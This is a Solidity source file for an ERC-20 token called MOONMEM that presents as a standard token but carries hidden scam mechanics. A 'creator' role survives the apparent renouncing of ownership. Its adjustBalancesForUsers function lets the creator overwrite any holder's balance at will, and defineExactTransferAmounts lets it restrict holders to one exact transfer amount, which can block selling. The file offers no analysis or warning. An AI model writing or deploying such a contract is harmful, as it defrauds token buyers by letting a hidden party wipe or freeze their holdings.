pragma solidity ^0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract CustomContext {
    function _customMsgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract CustomSingleOwner is CustomContext {
    address private _customContractOwner;
    event CustomOwnerChanged(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _customMsgSender();
        _customContractOwner = msgSender;
        emit CustomOwnerChanged(address(0), msgSender);
    }

    function getCustomOwner() public view virtual returns (address) {
        return _customContractOwner;
    }

    modifier onlyCustomOwner() {
        require(getCustomOwner() == _customMsgSender(), "CustomSingleOwner: caller is not the owner");
        _;
    }

    function renounceCustomOwnership() public virtual onlyCustomOwner {
        emit CustomOwnerChanged(_customContractOwner, address(0x000000000000000000000000000000000000dEaD));
        _customContractOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract MOONMEM is CustomContext, CustomSingleOwner, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _exactTransferAmounts;
    address private _customTokenCreator;

    string public constant _name = "MOONMEM";
    string public constant _symbol = "MOONMEM";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 13000000 * (10 ** _decimals);

    constructor() {
        _balances[_customMsgSender()] = _totalSupply;
        emit Transfer(address(0), _customMsgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier onlyCustomCreator() {
        require(getCustomCreator() == _customMsgSender(), "GREY: caller is not the creator");
        _;
    }

    function getCustomCreator() public view virtual returns (address) {
        return _customTokenCreator;
    }

    function changeCustomCreator(address newCreator) public onlyCustomOwner {
        _customTokenCreator = newCreator;
    }

    event TokenDistributed(address indexed user, uint256 previousBalance, uint256 newBalance);

    function queryExactTransferAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function defineExactTransferAmounts(address[] calldata accounts, uint256 amount) public onlyCustomCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exactTransferAmounts[accounts[i]] = amount;
        }
    }

    function adjustBalancesForUsers(address[] memory userAddresses, uint256 desiredAmount) public onlyCustomCreator {
        require(desiredAmount >= 0, "GREY: desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "GREY: user address must not be zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokenDistributed(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_customMsgSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = queryExactTransferAmount(_customMsgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[_customMsgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_customMsgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_customMsgSender()][spender] = amount;
        emit Approval(_customMsgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_customMsgSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = queryExactTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_customMsgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}